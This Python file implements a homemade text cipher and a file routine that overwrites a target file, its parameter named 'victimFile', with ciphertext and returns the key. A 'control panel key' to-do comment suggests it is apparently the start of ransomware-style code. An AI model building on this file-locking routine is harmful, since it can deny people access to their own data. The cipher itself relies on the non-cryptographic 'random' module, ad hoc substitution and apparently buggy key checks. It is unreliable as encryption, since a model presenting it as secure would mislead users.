import random
import base64
import binascii

#error handling requed
class Vencrypt():
    
    def __init__(self,key) -> None:

        self.key = base64.b64decode(key.encode()).decode()
        keys = self.key.split(".")
        self.b64key1 = keys[0]
        self.b64key2 = keys[1]
        


    #genarate key
    def genarateKey(defecult = None):
        character = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789<>?:}{)(_+*&^%$#@!~|,/';[]-=`"
        fkey = ""
        skey = ""
        tkey = ""
        key = ""

        if defecult == "M" or defecult == "m":
            length = 59
        elif defecult == "l":
            length = 78
        elif defecult == "L":
            length = 118
        elif defecult == "S" or defecult == "s":
            length = 29
        else:
            length = 39
    

        for i in range(length):
                fkey += character[random.randint(0,90)]
                skey += character[random.randint(0,90)]
                while fkey == skey:
                    skey += character[random.randint(0,90)]

                tkey += character[random.randint(0,90)]
                while True:
                    if tkey == skey or tkey == fkey:
                        tkey += character[random.randint(0,90)]
                        continue
                    else:
                        break

        

        key = fkey + "." + skey
        key = base64.b64encode(key.encode()).decode()

        return key
    
    def keyFilter(self,token):

        dic = {}
        for i in token:
            dic[i] = "#"

        filted = ""
        for key,value in dic.items():
            filted += str(key)
        
        return filted
    

    def intFilter(self,token):
        numbers = []
        for i in token:
            try:
                numbers.append(int(i))
            except:
                continue
        
        return numbers


    def get_key_by_value(self,dictionary, target_value):
        for key, value in dictionary.items():
            if value == target_value:
                return key




    def keyAlphabet(self):

        


        #variables
        alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,./;'[]-=\\|?><:}{+_*&^%~`$\"'#@!)(0123456789"
        alphabetKey = self.keyFilter(self.keyFilter(self.b64key1) + self.keyFilter(self.b64key2))
        alphabetKeyint = self.intFilter(self.b64key1 + self.b64key2)
        alphabet64 = []
        math = 0
        dictionory = {}
        dKeyCount = 0
        n = -1
        intphebet1 = ["00","11","22","33","44","55","66","77","88","99"]
        intphebet2 = ["000","111","222","333","444","555","666","777","888","999","110","111","112","113","114","115","116","117","118","119","220","221","222","223","224","225","226","227"]

        #calculatingnumber
        for j in alphabetKeyint:
            math += j
        math = math/len(alphabetKeyint)
        math = str(round(math, 1))
        alphabetKeyint = self.keyFilter(alphabetKeyint)

        for o in range(len(alphabet) - len(alphabetKey)):
            try:
                alphabet64.append(math + str(alphabetKeyint[o]) + intphebet1[o])
            except:
                alphabet64.append(math + intphebet2[n])
                n += -1

        #making dectionory
        ii = 0
        c = len(alphabet)
        for i in range(c):

            if dKeyCount < len(alphabetKey):
                dictionory[alphabet[dKeyCount]] = alphabetKey[i]
            else:
                dictionory[alphabet[dKeyCount]] = alphabet64[ii]
                ii += 1

            dKeyCount += 1

        
        return dictionory
    

    
    def combineDectionoryToText(self,CoPtext,dictionory,method):
        
        cleartextOrChipertext = ""
        cleartextOrChiperset = []
        tempint = ""
        i_i = 1

        if method == "d":

            for i in CoPtext:  #$yi}uq}u _U}UPz6z UQzzSz<z QzSE)z,$ U_ 4.214.214.27,$$6z C$< $_z<zPz 4KU Sz t~

                try:
                    i = int(i)
                except:
                    i = i


                if ((len(tempint) > 0) or (isinstance(i, int) and CoPtext[i_i] == "." )) or i == ".":
                    tempint += str(i)
                elif i == " ":
                    cleartextOrChiperset.append(" ")
                else:
                    cleartextOrChiperset.append(str(i))

                if len(tempint) == 6:
                    cleartextOrChiperset.append(tempint)
                    tempint = ""

                elif i_i == len(CoPtext) - 1:  #6 < 10
                    i_i = 0
                
                i_i += 1





            for j in cleartextOrChiperset:

                if j == " ":
                    cleartextOrChipertext += " "
                else:
                    cleartextOrChipertext += str(self.get_key_by_value(dictionory,j))



        elif method == "e":

            for i in CoPtext:
                
                if i == " ":
                    cleartextOrChipertext += " "
                else:
                    cleartextOrChipertext += dictionory[i]


        return cleartextOrChipertext

    #encryption tool
    def encrypt(self,cleartext):

        #making dectionaroy
        dictionory = self.keyAlphabet()

        #making first key
        fistb = self.key[(random.randint(0,10)):(random.randint(10,20))]

        while len(fistb) < 6:
            fistb = self.key[(random.randint(0,10)):(random.randint(10,20))]

        fistb = fistb[:6]

        #making chiper text
        chipertext = self.combineDectionoryToText(cleartext,dictionory,"e")
        
        encrypted = fistb + chipertext
        
        return encrypted
    


    #decrypt tool
    def decrypt(self,chipertext):

        #is key valid?
        num = 0
        while num + 6 < 21:

            if chipertext[:6] == self.b64key1[num:num + 6]:
                break
            else:
                num += 1

        if num + 6 == 20:
            return "Invalid Key! Can't decrypt without valid key"

        
        #making dectionory
        dictionory = self.keyAlphabet()
        #making chiper text
        chipertext = chipertext[6:]
        cleartext = self.combineDectionoryToText(chipertext,dictionory,"d")

        decrypted = cleartext

        return decrypted





class VencryptF():

    #encrypt file
    def encrypt(victimFile):

        key = Vencrypt.genarateKey()

        obj = Vencrypt(key)

        with open(victimFile, "rb") as file:
            content = file.read()

        content = binascii.hexlify(content)
        encrypted = obj.encrypt(content.decode())
        

        with open(victimFile, "wb") as file:
            file.write(encrypted.encode())   

        return key




    #decrypt file   
    def decrypt(key,victimFile):

        #to do control panel key = open("filekey.key","rb").read()   
        obj = Vencrypt(key)

        with open(victimFile, "rb") as enc_file:
            encrypted = enc_file.read()

        encrypted = encrypted.decode()

        decrypted = obj.decrypt(encrypted)
        binary_data = binascii.unhexlify(decrypted)

        with open(victimFile, "wb") as dec_file:
            dec_file.write(binary_data)

        
